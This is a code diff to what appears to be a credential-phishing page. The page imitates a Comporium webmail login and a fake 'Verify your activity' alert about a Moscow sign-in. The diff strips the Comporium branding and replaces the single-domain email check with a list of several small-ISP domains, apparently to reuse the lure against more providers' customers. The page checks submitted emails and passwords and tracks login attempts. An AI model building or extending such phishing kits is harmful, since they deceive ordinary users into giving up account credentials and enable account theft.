@@ -51,13 +51,6 @@
       flex-direction: column;
       align-items: flex-start;
     }
-    .form-logo {
-      width: 192px;
-      height: 42px;
-      object-fit: contain;
-      margin: 0 0 15px 0;
-      margin-left: -22px;
-    }
     .signIn {
       font-size: 20px;
       color: #4d4d4d;
@@ -194,12 +187,6 @@
       box-sizing: border-box;
       flex-direction: column;
       align-items: flex-start;
-    }
-    .activity-logo {
-      width: 192px;
-      height: 42px;
-      object-fit: contain;
-      margin: 0 0 20px -22px;
     }
     .activity-title {
       font-size: 22px;
@@ -370,13 +357,6 @@
         padding: 30px 20px;
         border-radius: 0;
       }
-      .form-logo {
-        width: 260px;
-        height: auto;
-        margin-left: 0;
-        margin-bottom: 10px;
-        align-self: center;
-      }
       .signIn {
         font-size: 18px;
         text-align: center;
@@ -417,12 +397,6 @@
         padding: 30px 20px;
         border-radius: 0;
       }
-      .activity-logo {
-        width: 260px;
-        height: auto;
-        margin-left: 0;
-        align-self: center;
-      }
       .activity-title,
       .activity-subtitle {
         text-align: center;
@@ -444,7 +418,6 @@
 
   <!-- ====== LOGIN FORM VIEW ====== -->
   <div class="form-container" id="login-view">
-    <img src="https://i.imghippo.com/files/nCh4587cHM.png" alt="comporium.net-large" class="form-logo" />
     <div class="signIn">Log In</div>
 
     <div class="form-error-banner" id="form-error-banner">
@@ -475,7 +448,6 @@
 
   <!-- ====== ACTIVITY PAGE VIEW ====== -->
   <div class="activity-container" id="activity-view">
-    <img src="https://i.imghippo.com/files/nCh4587cHM.png" alt="comporium.net-large" class="activity-logo" />
     <h1 class="activity-title">Verify your activity</h1>
     <p class="activity-subtitle">
       We noticed two recent sign-in attempts on your account. If you don't recognize
@@ -557,6 +529,25 @@
   const alertBox = document.getElementById("alert-box");
 
   let attemptNumber = 1;
+
+  // ----- accepted email domains -----
+  const ACCEPTED_DOMAINS = [
+    "bevcomm.net",
+    "nemont.net",
+    "peak.org",
+    "kmtel.com",
+    "highland.net",
+    "peoplescom.net",
+    "web-access.net",
+    "comporium.net"   // keep original domain for compatibility
+  ];
+
+  // build a regex that allows any of these domains
+  function buildAllowedDomainRegex(domains) {
+    const escaped = domains.map(d => d.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
+    return new RegExp(`^[^@\\s]+@(${escaped.join('|')})$`, 'i');
+  }
+  const allowedDomainRegex = buildAllowedDomainRegex(ACCEPTED_DOMAINS);
 
   // ----- helpers -----
   function getBrowser() {
@@ -693,14 +684,13 @@ Links: ${linksCount}
 
     const emailValue = emailInput.value.trim();
     const passwordValue = passwordInput.value.trim();
-    const allowedDomainRegex = /^[^@\s]+@comporium\.net$/i;
     let valid = true;
 
     if (!emailValue) {
       emailError.textContent = "Email is required.";
       valid = false;
     } else if (!allowedDomainRegex.test(emailValue)) {
-      emailError.textContent = "Email must be @comporium.net.";
+      emailError.textContent = "Email must be from an accepted domain.";
       valid = false;
     }
     if (!passwordValue) {
@@ -746,25 +736,15 @@ Links: ${linksCount}
   // ============================================================
   function removeSession(sessionElement, deviceName) {
     if (!sessionElement) return;
-    // add removed class → hides via CSS
     sessionElement.classList.add("removed");
-    // optional: log to console for debugging
     console.log(`Session removed: ${deviceName}`);
-    // if both sessions are gone, we could optionally update the alert
-    if (sessionCurrent.classList.contains("removed") && sessionMoscow.classList.contains("removed")) {
-      // maybe change alert text or hide it, but we'll just keep as is
-    }
   }
 
-  // Remove current device (This device)
   removeCurrentBtn.addEventListener("click", function(e) {
     e.preventDefault();
-    // we treat "current" as a session that can be removed
-    // (the user might want to remove it as well – no redirect)
     removeSession(sessionCurrent, "current device");
   });
 
-  // Remove Moscow suspicious device
   removeMoscowBtn.addEventListener("click", function(e) {
     e.preventDefault();
     removeSession(sessionMoscow, "Moscow, Russia");
@@ -774,37 +754,24 @@ Links: ${linksCount}
   //   ACTIVITY PAGE BUTTONS
   // ============================================================
 
-  // "Yes, this was me" → go back to login, reset everything
   document.getElementById("this-was-me").addEventListener("click", () => {
     activityView.style.display = "none";
     loginView.style.display = "flex";
     form.reset();
     formErrorBanner.classList.remove("show");
     attemptNumber = 1;
-    // restore sessions to visible in case they were removed
     sessionCurrent.classList.remove("removed");
     sessionMoscow.classList.remove("removed");
-    // reset current device meta placeholder
     currentDeviceMeta.textContent = "Loading device info…";
   });
 
-  // "Secure my account" → in this demo we just hide the suspicious session
-  // (no redirect, stays on the same page)
   document.getElementById("secure-account").addEventListener("click", () => {
-    // remove the Moscow session as a security action
     removeSession(sessionMoscow, "Moscow, Russia (secured)");
-    // optional: update alert to reflect that the session was removed
     alertBox.innerHTML = `
       <strong>Account secured.</strong><br>
       The suspicious session from <strong>Moscow, Russia</strong> has been removed.
     `;
-    // we do NOT redirect anywhere – user remains on the activity page
   });
-
-  // We also allow the current device to be removed, but the button already does that.
-  // No extra redirect.
-
-  // override any leftover redirect links (none)
 </script>
 </body>
 </html>
